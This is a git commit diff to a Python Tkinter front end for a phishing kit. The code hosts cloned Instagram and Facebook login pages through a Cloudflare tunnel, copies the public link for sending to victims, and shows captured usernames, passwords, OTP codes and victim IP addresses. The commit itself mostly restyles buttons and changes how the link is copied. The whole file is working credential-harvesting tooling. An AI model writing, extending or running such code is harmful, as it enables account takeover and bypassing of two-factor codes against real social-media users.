77a0b3358da29a970eaf418753d7ecf3378d97ab
nepalese-noob <rupesh54321kumar@gmail.com>
2022-04-04 15:51:10 +0000

    updated

--- sociallink.py
+++ sociallink.py
@@ -2,10 +2,6 @@ from tkinter import *
 import os
 def sites():
 	def fishinsta():
-		def linkwindow():
-			f = open("process/new.txt")
-			copyplace.delete(0, END)
-			copyplace.insert(INSERT, f.read())
 		link = os.system("cd assets/sites/instagram; hostit -f cloudflare 8080 --silent> ../../../process/link.txt 2>&1; grep -o 'https://[-0-9a-z]*\.trycloudflare.com' '../../../process/link.txt' > ../../../process/new.txt; rm ../../../process/link.txt")
 		def capture():
 			file_size = os.path.getsize('assets/sites/instagram/log.txt')
@@ -22,6 +18,19 @@ def sites():
 			h = open("process/password.txt")
 			pwarea.delete(0, END)
 			pwarea.insert(INSERT, h.read())
+		def copying(event):
+			copybutton.config(text="copied link",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN)
+			copier = Tk()
+			f = open("process/new.txt")
+			copier.withdraw()
+			copier.clipboard_clear()
+			copier.clipboard_append(f.read())
+			copier.update()
+			copier.destroy()
+		def destroy():
+			root.destroy()
+			root1.destroy()
+			root4.destroy()		
 		def otpget():
 			i = open("process/otp.txt")
 			otparea.delete(0, END)
@@ -35,41 +44,39 @@ def sites():
 		
 		copyplace = Entry(root4, width=60, font="Calibri 10")
 		copyplace.grid(row=0,column=2)
-		copyplace.insert(INSERT, "click copy link to get link")
-		copybutton = Button(root4,text="copy link", command= linkwindow)
+		copyplace.insert(INSERT, "click copy link to get link")	
+		copybutton = Button(root4,text="copy button",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN)
+		copybutton.bind('<Enter>', copying)
 		copybutton.grid(row=0, column=0)
 		
-		listener = Button(root4, text="start capturing", command=capture).grid(row=1,column=0)
+		listener = Button(root4, text="start capturing",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command=capture).grid(row=1,column=0)
 	
-		ip = Button(root4,text="ip", command= ipfinder)
+		ip = Button(root4,text="ip",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= ipfinder)
 		ip.grid(row=2, column=0)
-		ipplace= Entry(root4, width=60,height=50, font="Calibri 10")
+		ipplace= Entry(root4, width=60, font="Calibri 10")
 		ipplace.grid(row=2, column=2)
 		ipplace.insert(INSERT, "click ip to update")
 		
-		username = Button(root4,text="username", command= uname)
+		username = Button(root4,text="username",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= uname)
 		username.grid(row=3, column=0)
 		unameplace= Entry(root4, width=60, font="Calibri 10")
 		unameplace.grid(row=3, column=2)
 		unameplace.insert(INSERT, "click username to update")
 		
-		pw = Button(root4,text="password", command= pwget)
+		pw = Button(root4,text="password",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= pwget)
 		pw.grid(row=4, column=0)
 		pwarea = Entry(root4, width=60, font="Calibri 10")
 		pwarea.grid(row=4,column=2)
 		pwarea.insert(INSERT, "click password to update")
 		
-		otp = Button(root4,text="OTP", command= otpget)
+		otp = Button(root4,text="OTP",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= otpget)
 		otp.grid(row=5, column=0)
 		otparea = Entry(root4, width=60, font="Calibri 10")
 		otparea.grid(row=5,column=2)
 		otparea.insert(INSERT, "click OTP to update")
+		closeall=Button(root4, text="Exit all",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= destroy).grid(row=6, column=2),
 		root4.mainloop()
-	def fishfacebook():
-		def linkwindow():
-			f = open("process/new.txt")
-			copyplace.delete(0, END)
-			copyplace.insert(INSERT, f.read())
+	def fishfacebook():		
 		link = os.system("cd assets/sites/facebook; hostit -f cloudflare 8080 --silent> ../../../process/link.txt 2>&1; grep -o 'https://[-0-9a-z]*\.trycloudflare.com' '../../../process/link.txt' > ../../../process/new.txt; rm ../../../process/link.txt")
 		def capture():
 			file_size = os.path.getsize('assets/sites/facebook/log.txt')
@@ -82,6 +89,15 @@ def sites():
 			g= open('process/username.txt', 'r')	 
 			unameplace.delete(0, END)
 			unameplace.insert(INSERT, g.read())
+		def copying(event):
+			copybutton.config(text="copied link",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN)
+			copier = Tk()
+			f = open("process/new.txt")
+			copier.withdraw()
+			copier.clipboard_clear()
+			copier.clipboard_append(f.read())
+			copier.update()
+			copier.destroy()
 		def pwget():
 			h = open("process/password.txt")
 			pwarea.delete(0, END)
@@ -94,19 +110,17 @@ def sites():
 			j = open("process/ip.txt")
 			ipplace.delete(0, END)
 			ipplace.insert(INSERT, j.read())
-			#ip.config(root3,text="ip2location", command= iplocater)
 		def destroy():
 			root.destroy()
 			root1.destroy()
-			root3.destroy()
-			root4.destroy()	
+			root3.destroy()	
 		root3 = Tk()
 		root3.title("Facebook link")
 		root3.geometry("800x300+400+430")
-		copyplace = Entry(root3, width=60, font="Calibri 10")
+		copyplace = Label(root3,text="click copy link to copy generated link", width=60, font="Calibri 10")
 		copyplace.grid(row=0,column=2)
-		copyplace.insert(INSERT, "click copy link to get link")
-		copybutton = Button(root3,text="copy link",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= linkwindow)
+		copybutton = Button(root3,text="copy link",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN)
+		copybutton.bind('<Enter>', copying)
 		copybutton.grid(row=0, column=0)
 		listener = Button(root3, text="start capturing", font=('Times New Roman', 18,'bold'), bg="blue", fg="yellow", state="normal", activebackground="pink", activeforeground="red", cursor="hand2", relief=SUNKEN, command=capture).grid(row=1,column=0)
 	
